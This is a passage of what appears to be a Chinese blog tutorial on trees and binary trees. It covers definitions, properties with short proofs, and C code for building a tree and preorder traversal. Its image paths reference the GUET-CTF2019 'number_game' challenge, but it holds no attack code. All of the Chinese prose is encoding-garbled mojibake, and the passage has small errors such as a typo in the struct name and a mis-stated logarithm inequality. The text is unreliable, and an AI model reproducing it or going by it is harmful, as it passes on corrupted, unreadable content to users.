‘çš„ä¸ªæ•°æ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯å®ƒä»¬ä¸€å®šæ˜¯äº’ä¸ç›¸äº¤çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºçš„å°±ä¸æ˜¯æ ‘ã€‚å› ä¸ºåœ¨è¿™ä¸¤ä¸ªå›¾ä¸­ï¼Œa çš„å­æ ‘éƒ½æœ‰ç›¸äº¤çš„è¾¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/notTree.png" alt="notTree"></p><h5 id="2ã€ç»“ç‚¹çš„å®šä¹‰"><a href="#2ã€ç»“ç‚¹çš„å®šä¹‰" class="headerlink" title="2ã€ç»“ç‚¹çš„å®šä¹‰"></a>2ã€ç»“ç‚¹çš„å®šä¹‰</h5><p>â€ƒâ€ƒæ ‘çš„ç»“ç‚¹åŒ…å«ä¸€ä¸ª æ•°æ®åŸŸ å’Œ m ä¸ª æŒ‡é’ˆåŸŸ ç”¨æ¥æŒ‡å‘å®ƒçš„å­æ ‘ã€‚ç»“ç‚¹çš„ç§ç±»åˆ†ä¸ºï¼šæ ¹ç»“ç‚¹ã€å¶å­ç»“ç‚¹ã€å†…éƒ¨ç»“ç‚¹ã€‚ç»“ç‚¹æ‹¥æœ‰å­æ ‘çš„ä¸ªæ•°è¢«ç§°ä¸º ç»“ç‚¹çš„åº¦ã€‚æ ‘ä¸­å„ä¸ªç»“ç‚¹åº¦çš„æœ€å¤§å€¼è¢«ç§°ä¸º æ ‘çš„åº¦ã€‚</p><p>1ï¼‰æ ¹ç»“ç‚¹<br>â€ƒâ€ƒä¸€æ£µæ ‘çš„æ ¹ç»“ç‚¹åªæœ‰ä¸€ä¸ªã€‚</p><p>2ï¼‰å¶å­ç»“ç‚¹<br>â€ƒâ€ƒåº¦ä¸º 0 çš„ç»“ç‚¹è¢«ç§°ä¸º å¶å­ç»“ç‚¹ æˆ–è€… ç»ˆç«¯ç»“ç‚¹ã€‚å¶å­ç»“ç‚¹çš„ä¸æŒ‡å‘ä»»ä½•å­æ ‘ã€‚</p><p>3ï¼‰å†…éƒ¨ç»“ç‚¹<br>â€ƒâ€ƒé™¤äº†æ ¹ç»“ç‚¹å’Œå¶å­ç»“ç‚¹ä»¥å¤–çš„ç»“ç‚¹ï¼Œè¢«ç§°ä¸ºå†…éƒ¨ç»“ç‚¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/points.png" alt="points"></p><p>â€ƒâ€ƒå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçº¢è‰²ç»“ç‚¹ ä¸ºæ ¹ç»“ç‚¹ï¼Œè“è‰²ç»“ç‚¹ ä¸ºå†…éƒ¨ç»“ç‚¹ï¼Œé»„è‰²ç»“ç‚¹ ä¸ºå¶å­ç»“ç‚¹ã€‚</p><p>3ã€ç»“ç‚¹é—´å…³ç³»<br>1ï¼‰å­©å­ç»“ç‚¹<br>â€ƒâ€ƒå¯¹äºæŸä¸ªç»“ç‚¹ï¼Œå®ƒçš„å­æ ‘çš„æ ¹ç»“ç‚¹ï¼Œè¢«ç§°ä¸ºè¯¥ç»“ç‚¹çš„ å­©å­ç»“ç‚¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/chilTree.png" alt="chilTree"></p><p>â€ƒâ€ƒå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé»„è‰²ç»“ç‚¹ d æ˜¯ çº¢è‰²ç»“ç‚¹ b çš„å­©å­ç»“ç‚¹ã€‚</p><p>2ï¼‰çˆ¶ç»“ç‚¹<br>â€ƒâ€ƒè€Œè¯¥ç»“ç‚¹è¢«ç§°ä¸ºå­©å­ç»“ç‚¹çš„ çˆ¶ç»“ç‚¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/faTree.png" alt="faTree"></p><p>â€ƒâ€ƒå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè“è‰²ç»“ç‚¹ a æ˜¯ çº¢è‰²ç»“ç‚¹ b çš„çˆ¶ç»“ç‚¹ã€‚</p><p>3ï¼‰å…„å¼Ÿç»“ç‚¹<br>â€ƒâ€ƒåŒä¸€çˆ¶ç»“ç‚¹ä¸‹çš„å­©å­ç»“ç‚¹ï¼Œäº’ç›¸ç§°ä¸º å…„å¼Ÿç»“ç‚¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/broTree.png" alt="broTree"></p><p>â€ƒâ€ƒå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç»¿è‰²ç»“ç‚¹ c å’Œ çº¢è‰²ç»“ç‚¹ b äº’ä¸ºå…„å¼Ÿç»“ç‚¹ã€‚</p><p>4ã€æ ‘çš„æ·±åº¦<br>â€ƒâ€ƒç»“ç‚¹çš„å±‚æ¬¡ä»æ ¹ç»“ç‚¹å¼€å§‹è®°ä¸ºç¬¬ 1 å±‚ï¼Œå¦‚æœæŸç»“ç‚¹åœ¨ç¬¬ i å±‚ï¼Œåˆ™å®ƒçš„å­æ ‘çš„æ ¹ç»“ç‚¹å°±åœ¨ç¬¬i+1 å±‚ï¼Œæ ‘ä¸­ç»“ç‚¹çš„æœ€å¤§å±‚æ¬¡ç§°ä¸º æ ‘çš„æ·±åº¦ã€‚<br>â€ƒâ€ƒå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä»£è¡¨çš„æ˜¯ä¸€æ£µæ·±åº¦ä¸º 4 çš„æ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/treeDeepth.png" alt="treeDeepth"></p><p>5ã€æ£®æ—çš„å®šä¹‰<br>â€ƒâ€ƒæ£®æ—æ˜¯ m æ£µ äº’ä¸ç›¸äº¤çš„æ ‘çš„é›†åˆï¼Œå¯¹äºæ ‘çš„æ¯ä¸ªç»“ç‚¹è€Œè¨€ï¼Œå…¶å­æ ‘é›†åˆå°±æ˜¯æ£®æ—ã€‚<br>â€ƒâ€ƒå¦‚å›¾æ‰€ç¤ºï¼Œb å’Œ c ä¸¤æ£µå­æ ‘ç»„æˆçš„é›†åˆå°±æ˜¯ä¸€ä¸ªæ£®æ—ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/forest.png" alt="forest"></p><p>äºŒã€äºŒå‰æ ‘çš„æ¦‚å¿µ<br>1ã€äºŒå‰æ ‘çš„æ€§è´¨<br>â€ƒâ€ƒäºŒå‰æ ‘æ˜¯ä¸€ç§æ ‘ï¼Œå®ƒæœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹å¾ï¼š<br>â€ƒâ€ƒâ€ƒâ€ƒ1ï¼‰æ¯ä¸ªç»“ç‚¹æœ€å¤š 2 æ£µå­æ ‘ï¼Œå³æ¯ä¸ªç»“ç‚¹çš„å­©å­ç»“ç‚¹ä¸ªæ•°ä¸º 0ã€1ã€2ï¼›<br>â€ƒâ€ƒâ€ƒâ€ƒ2ï¼‰è¿™ä¸¤æ£µå­æ ‘æ˜¯æœ‰é¡ºåºçš„ï¼Œåˆ†åˆ«å«ï¼šå·¦å­æ ‘ å’Œ å³å­æ ‘ï¼›<br>â€ƒâ€ƒâ€ƒâ€ƒ3ï¼‰å¦‚æœåªæœ‰ä¸€æ£µå­æ ‘çš„æƒ…å†µï¼Œä¹Ÿéœ€è¦åŒºåˆ†é¡ºåºï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p>â€ƒâ€ƒb ä¸º a çš„å·¦å­æ ‘ï¼›</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/leftKidTree.png" alt="leftKidTree"></p><p>â€ƒâ€ƒc ä¸º a çš„å³å­æ ‘ï¼›ã€</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/righjtKidTree.png" alt="righjtKidTree"></p><p>2ã€ç‰¹æ®ŠäºŒå‰æ ‘<br>1ï¼‰æ–œæ ‘<br>â€ƒâ€ƒæ‰€æœ‰ç»“ç‚¹éƒ½åªæœ‰å·¦å­æ ‘çš„äºŒå‰æ ‘è¢«ç§°ä¸ºå·¦æ–œæ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/leftTree.png" alt="leftTree"></p><p>â€ƒâ€ƒæ‰€æœ‰ç»“ç‚¹éƒ½åªæœ‰å³å­æ ‘çš„äºŒå‰æ ‘è¢«ç§°ä¸ºå³æ–œæ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/rightTree.png" alt="rightTree"></p><p>â€ƒâ€ƒæ–œæ ‘æœ‰ç‚¹ç±»ä¼¼çº¿æ€§è¡¨ï¼Œæ‰€ä»¥çº¿æ€§è¡¨å¯ä»¥ç†è§£ä¸ºä¸€ç§ç‰¹æ®Šå½¢å¼çš„æ ‘ã€‚</p><p>2ï¼‰æ»¡äºŒå‰æ ‘<br>â€ƒâ€ƒå¯¹äºä¸€æ£µäºŒå‰æ ‘ï¼Œå¦‚æœå®ƒçš„æ‰€æœ‰æ ¹ç»“ç‚¹å’Œå†…éƒ¨ç»“ç‚¹éƒ½å­˜åœ¨å·¦å³å­æ ‘ï¼Œä¸”æ‰€æœ‰å¶å­ç»“ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œè¿™æ ·çš„æ ‘å°±æ˜¯æ»¡äºŒå‰æ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/fullTree.png" alt="fullTree"></p><p>â€ƒâ€ƒæ»¡äºŒå‰æ ‘æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š<br>â€ƒâ€ƒâ€ƒâ€ƒ1ï¼‰å¶å­ç»“ç‚¹ä¸€å®šåœ¨æœ€åä¸€å±‚ï¼›<br>â€ƒâ€ƒâ€ƒâ€ƒ2ï¼‰éå¶å­ç»“ç‚¹çš„åº¦ä¸º 2ï¼›<br>â€ƒâ€ƒâ€ƒâ€ƒ3ï¼‰æ·±åº¦ç›¸åŒçš„äºŒå‰æ ‘ï¼Œæ»¡äºŒå‰æ ‘çš„ç»“ç‚¹ä¸ªæ•°æœ€å¤šï¼Œä¸º ï¼ˆå…¶ä¸­ h ä»£è¡¨æ·±åº¦ï¼‰ã€‚</p><p>2ï¼‰å®Œå…¨äºŒå‰æ ‘<br>â€ƒâ€ƒå¯¹ä¸€æ£µå…·æœ‰ n ä¸ªç»“ç‚¹çš„äºŒå‰æ ‘æŒ‰ç…§å±‚åºè¿›è¡Œç¼–å·ï¼Œå¦‚æœç¼–å· i çš„ç»“ç‚¹å’ŒåŒæ ·æ·±åº¦çš„æ»¡äºŒå‰æ ‘ä¸­çš„ç¼–å· i çš„ç»“ç‚¹åœ¨äºŒå‰æ ‘ä¸­ä½ç½®å®Œå…¨ç›¸åŒï¼Œåˆ™è¢«ç§°ä¸º å®Œå…¨äºŒå‰æ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/perfectTree.png" alt="perfectTree"></p><p>â€ƒâ€ƒæ»¡äºŒå‰æ ‘ä¸€å®šæ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œè€Œå®Œå…¨äºŒå‰æ ‘åˆ™ä¸ä¸€å®šæ˜¯æ»¡äºŒå‰æ ‘ã€‚<br>â€ƒâ€ƒå®Œå…¨äºŒå‰æ ‘æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š<br>â€ƒâ€ƒâ€ƒâ€ƒ1ï¼‰å¶å­ç»“ç‚¹åªèƒ½å‡ºç°åœ¨æœ€ä¸‹é¢ä¸¤å±‚ã€‚<br>â€ƒâ€ƒâ€ƒâ€ƒ2ï¼‰æœ€ä¸‹å±‚çš„å¶å­ç»“ç‚¹ä¸€å®šæ˜¯é›†ä¸­åœ¨å·¦è¾¹çš„è¿ç»­ä½ç½®ï¼›å€’æ•°ç¬¬äºŒå±‚å¦‚æœæœ‰å¶å­ç»“ç‚¹ï¼Œä¸€å®šé›†ä¸­åœ¨å³è¾¹çš„è¿ç»­ä½ç½®ã€‚<br>â€ƒâ€ƒâ€ƒâ€ƒ3ï¼‰å¦‚æœæŸä¸ªç»“ç‚¹åº¦ä¸º 1ï¼Œåˆ™åªæœ‰å·¦å­æ ‘ï¼Œå³ ä¸å­˜åœ¨åªæœ‰å³å­æ ‘ çš„æƒ…å†µã€‚<br>â€ƒâ€ƒâ€ƒâ€ƒ4ï¼‰åŒæ ·ç»“ç‚¹æ•°çš„äºŒå‰æ ‘ï¼Œå®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦æœ€å°ã€‚</p><p>â€ƒâ€ƒå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°±ä¸æ˜¯ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ï¼Œå› ä¸º 5 å·ç»“ç‚¹æ²¡æœ‰å³å­æ ‘ï¼Œä½†æ˜¯ 6 å·ç»“ç‚¹æ˜¯æœ‰å·¦å­æ ‘çš„ï¼Œä¸æ»¡è¶³ä¸Šè¿°ç¬¬ 2 ç‚¹ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/notPErfectTree.png" alt="notPErfectTree"></p><h5 id="3ã€äºŒå‰æ ‘çš„æ€§è´¨"><a href="#3ã€äºŒå‰æ ‘çš„æ€§è´¨" class="headerlink" title="3ã€äºŒå‰æ ‘çš„æ€§è´¨"></a>3ã€äºŒå‰æ ‘çš„æ€§è´¨</h5><p>â€ƒâ€ƒæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼ŒäºŒå‰æ ‘æœ‰å“ªäº›é‡è¦çš„æ€§è´¨ã€‚</p><p>1ï¼‰æ€§è´¨1<br>â€ƒâ€ƒ<strong>ã€æ€§è´¨1ã€‘äºŒå‰æ ‘çš„ç¬¬ i(iâ‰¥1) å±‚ä¸Šè‡³å¤šæœ‰ 2<sup>i-1</sup> ä¸ªç»“ç‚¹ã€‚</strong></p><p>â€ƒâ€ƒæ—¢ç„¶æ˜¯è‡³å¤šï¼Œå°±åªéœ€è¦è€ƒè™‘æ»¡äºŒå‰æ ‘çš„æƒ…å†µï¼Œå¯¹äºæ»¡äºŒå‰æ ‘è€Œè¨€ï¼Œå½“å‰å±‚çš„ç»“ç‚¹æ•°æ˜¯ä¸Šä¸€å±‚çš„ä¸¤å€ï¼Œç¬¬ä¸€å±‚çš„ç»“ç‚¹æ•°ä¸º 1ï¼Œæ‰€ä»¥ç¬¬ i çš„ç»“ç‚¹æ•°å¯ä»¥é€šè¿‡ç­‰æ¯”æ•°åˆ—å…¬å¼è®¡ç®—å‡ºæ¥ï¼Œä¸º2<sup>i-1</sup> ã€‚</p><p>2ï¼‰æ€§è´¨2<br>â€ƒâ€ƒ<strong>ã€æ€§è´¨2ã€‘æ·±åº¦ä¸º h çš„äºŒå‰æ ‘è‡³å¤šæœ‰ 2<sup>h</sup>-1ç»“ç‚¹ã€‚</strong></p><p>â€ƒâ€ƒå¯¹äºä»»æ„ä¸€ä¸ªæ·±åº¦ä¸º h çš„äºŒå‰æ ‘ï¼Œæ»¡äºŒå‰æ ‘çš„ç»“ç‚¹æ•°ä¸€å®šæ˜¯æœ€å¤šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‹¿æ»¡äºŒå‰æ ‘è¿›è¡Œè®¡ç®—ï¼Œå®ƒçš„æ¯ä¸€å±‚çš„ç»“ç‚¹æ•°ä¸º1ã€2ã€4ã€8 â€¦ã€2<sup>h-1</sup>ã€‚<br>â€ƒâ€ƒåˆ©ç”¨ç­‰æ¯”æ•°åˆ—æ±‚å’Œå…¬å¼ï¼Œå¾—åˆ°æ€»çš„ç»“ç‚¹æ•°ä¸ºï¼š1+2+4+8+ â€¦+2<sup>h-1</sup>&#x3D;2<sup>h</sup>-1</p><p>3ï¼‰æ€§è´¨3<br>â€ƒâ€ƒ<strong>ã€æ€§è´¨3ã€‘å¯¹äºä»»æ„ä¸€æ£µäºŒå‰æ ‘ Tï¼Œå¦‚æœå¶å­ç»“ç‚¹æ•°ä¸º x0ï¼Œåº¦ä¸º 2 çš„ç»“ç‚¹æ•°ä¸º x2ï¼Œåˆ™x0&#x3D;x2+1</strong></p><p>â€ƒâ€ƒä»¤ x1 ä»£è¡¨åº¦ ä¸º 1 çš„ç»“ç‚¹æ•°ï¼Œæ€»çš„ç»“ç‚¹æ•°ä¸º nï¼Œåˆ™æœ‰ï¼š<strong>n&#x3D;x0+x1+x2</strong>  â€¦â€¦â‘ <br>â€ƒâ€ƒä»»æ„ä¸€ä¸ªç»“ç‚¹åˆ°å®ƒå­©å­ç»“ç‚¹çš„è¿çº¿æˆ‘ä»¬ç§°ä¸ºè¿™æ£µæ ‘çš„ä¸€æ¡è¾¹ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªéç©ºæ ‘è€Œè¨€ï¼Œè¾¹æ•°ç­‰äºç»“ç‚¹æ•°å‡ä¸€ï¼Œä»¤è¾¹æ•°ä¸º eï¼Œåˆ™æœ‰ï¼š<strong>e&#x3D;nâˆ’1</strong> â€¦â€¦â‘¡</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E6%80%A7%E8%B4%A83.png" alt="æ€§è´¨3"></p><p>å¯¹äºåº¦ä¸º 1 çš„ç»“ç‚¹ï¼Œå¯ä»¥æä¾› 1 æ¡è¾¹ï¼Œå¦‚å›¾ä¸­çš„<strong>é»„è‰²ç»“ç‚¹</strong>ï¼›å¯¹äºåº¦ä¸º 2 çš„ç»“ç‚¹ï¼Œå¯ä»¥æä¾› 2 æ¡è¾¹ï¼Œå¦‚å›¾ä¸­çš„<strong>çº¢è‰²ç»“ç‚¹</strong>ã€‚æ‰€ä»¥è¾¹æ•°åˆå¯ä»¥é€šè¿‡åº¦ä¸º 1 å’Œ 2 çš„ç»“ç‚¹æ•°è®¡ç®—å¾—å‡ºï¼š<strong>e&#x3D;x1+2x2</strong>  â€¦â€¦â‘¢              </p><p>è”ç«‹ä¸Šè¿°â‘ â‘¡â‘¢ä¸‰ä¸ªç­‰å¼ï¼Œå¾—åˆ°ï¼š<strong>e&#x3D;nâˆ’1&#x3D;x0+x1+x2âˆ’1&#x3D;x1+2x2</strong></p><p>åŒ–ç®€åï¼Œå¾—è¯ï¼š<strong>x0&#x3D;x2+1</strong>  </p><p>4ï¼‰æ€§è´¨4<br>â€ƒâ€ƒ**ã€æ€§è´¨4ã€‘å…·æœ‰ n ä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ä¸º **[log2]n+1</p><p>â€ƒâ€ƒç”±ã€æ€§è´¨2ã€‘å¯å¾—ï¼Œæ·±åº¦ä¸º â„h çš„äºŒå‰æ ‘è‡³å¤šæœ‰<strong>2<sup>h</sup>-1</strong>ä¸ªç»“ç‚¹ã€‚æ‰€ä»¥ï¼Œå‡è®¾ä¸€æ£µæ ‘çš„æ·±åº¦ä¸º hï¼Œå®ƒçš„ç»“ç‚¹æ•°ä¸º nï¼Œåˆ™å¿…ç„¶æ»¡è¶³ï¼š<strong>nâ‰¤2<sup>h</sup>-1</strong></p><p>ç”±äºæ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œå®ƒä¸€å®šæ¯”æ·±åº¦ä¸º â„âˆ’1hâˆ’1 çš„ç»“ç‚¹æ•°è¦å¤šï¼Œå³ï¼š<strong>2<sup>h-1</sup> - 1 &lt; n</strong></p><p>å°†ä¸Šè¿°ä¸¤ä¸ªä¸ç­‰å¼ï¼Œç¨åŠ æ•´ç†ï¼Œå¾—åˆ°ï¼š2<sup>h-1</sup> â‰¤ n &lt; 2<sup>h</sup> </p><p>ç„¶åï¼Œå¯¹ä¸ç­‰å¼ä¸¤è¾¹å–ä»¥2ä¸ºåº•çš„å¯¹æ•°ï¼Œå¾—åˆ°ï¼šh-1â‰¤[log2]n+1 &lt;h</p><p>è¿™é‡Œï¼Œç”±äº h ä¸€å®šæ˜¯æ•´æ•°ï¼Œæ‰€ä»¥æœ‰ï¼šh &#x3D; [log2]n+1</p><h4 id="äºŒã€äºŒå‰æ ‘çš„å‚¨å­˜å’Œåˆ›å»º"><a href="#äºŒã€äºŒå‰æ ‘çš„å‚¨å­˜å’Œåˆ›å»º" class="headerlink" title="äºŒã€äºŒå‰æ ‘çš„å‚¨å­˜å’Œåˆ›å»º"></a>äºŒã€äºŒå‰æ ‘çš„å‚¨å­˜å’Œåˆ›å»º</h4><h5 id="1ã€åˆ›å»ºäºŒå‰é“¾ç»“æ„"><a href="#1ã€åˆ›å»ºäºŒå‰é“¾ç»“æ„" class="headerlink" title="1ã€åˆ›å»ºäºŒå‰é“¾ç»“æ„"></a>1ã€åˆ›å»ºäºŒå‰é“¾ç»“æ„</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// äºŒå‰æ ‘ç»“æ„ä½“</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BrinyTree</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BrinyTree</span>* left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BrinyTree</span>* right;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">&#125;BT;</span><br></pre></td></tr></table></figure><h5 id="2ã€æ‰‹åŠ¨æ„å»ºä¸€é¢—æ ‘"><a href="#2ã€æ‰‹åŠ¨æ„å»ºä¸€é¢—æ ‘" class="headerlink" title="2ã€æ‰‹åŠ¨æ„å»ºä¸€é¢—æ ‘"></a>2ã€æ‰‹åŠ¨æ„å»ºä¸€é¢—æ ‘</h5><p>å…¶å®æ„å»ºä¸€æ£µæ ‘çš„æ€æƒ³è¿˜æ˜¯æŒºç®€å•çš„ï¼ŒæŒ‰ç…§å›¾ç¤ºåˆ›å»º6ä¸ªèŠ‚ç‚¹ï¼Œå¹¶æ ¹æ®å›¾ä¸­çš„æ ·å­å°†èŠ‚ç‚¹é¡ºæ¬¡é“¾æ¥èµ·æ¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹ ï¼ˆæœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼ç±»å‹ä¸º---ç»“æ„ä½“æŒ‡é’ˆï¼‰</span></span><br><span class="line"><span class="function">BT* <span class="title">BuyNode</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BT* newnode = (BT*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BT));</span><br><span class="line"><span class="keyword">if</span> (newnode == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;malloc fail!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;data = x;</span><br><span class="line">newnode-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">newnode-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> newnode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªæ ‘</span></span><br><span class="line"><span class="function">BT* <span class="title">CreatBinaryTree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// åˆ›å»º6ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">BT* node1 = <span class="built_in">BuyNode</span>(<span class="number">1</span>);</span><br><span class="line">BT* node2 = <span class="built_in">BuyNode</span>(<span class="number">2</span>);</span><br><span class="line">BT* node3 = <span class="built_in">BuyNode</span>(<span class="number">3</span>);</span><br><span class="line">BT* node4 = <span class="built_in">BuyNode</span>(<span class="number">4</span>);</span><br><span class="line">BT* node5 = <span class="built_in">BuyNode</span>(<span class="number">5</span>);</span><br><span class="line">BT* node6 = <span class="built_in">BuyNode</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç»“ç‚¹è¿æ¥èµ·æ¥ï¼Œæ„æˆè‡ªå·±æƒ³è¦çš„æ ‘</span></span><br><span class="line">    node1-&gt;left = node2;</span><br><span class="line">    node1-&gt;right = node4;</span><br><span class="line">    node2-&gt;left = node3;</span><br><span class="line">    node4-&gt;left = node5;</span><br><span class="line">    node4-&gt;right = node6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸‰ã€äºŒå‰æ ‘çš„éå†-ï¼ˆé‡ç‚¹ï¼‰"><a href="#ä¸‰ã€äºŒå‰æ ‘çš„éå†-ï¼ˆé‡ç‚¹ï¼‰" class="headerlink" title="ä¸‰ã€äºŒå‰æ ‘çš„éå† ï¼ˆé‡ç‚¹ï¼‰"></a>ä¸‰ã€äºŒå‰æ ‘çš„éå† ï¼ˆé‡ç‚¹ï¼‰</h4><h5 id="1ã€å‰åºéå†"><a href="#1ã€å‰åºéå†" class="headerlink" title="1ã€å‰åºéå†"></a>1ã€å‰åºéå†</h5><p>â€‹å‰åºéå†çš„ä»£ç éå¸¸ç®€æ´ï¼ŒçŸ­çŸ­å‡ è¡Œå³å¯æ“ä½œï¼Œå…ˆçœ‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‰åºéå† æ ¹ å·¦ å³</span></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">PrevOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// å¦‚æœä¸ºç©ºï¼Œå°±æ‰“å°</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// å½“å‰å‡½æ•°ç»“æŸ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line"><span class="built_in">PrevOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">PrevOrder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="å‰åºéå†"></p><h5 id="2ã€ä¸­åºéå†"><a href="#2ã€ä¸­åºéå†" class="headerlink" title="2ã€ä¸­åºéå†"></a><strong>2ã€ä¸­åºéå†</strong></h5><p>ä¸­åºéå†çš„ä»£ç å’Œå‰åºéå†ä¸€æ ·ï¼Œçœ‹èµ·æ¥éƒ½éå¸¸ç®€æ´ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸­åºéå†  å·¦ æ ¹ 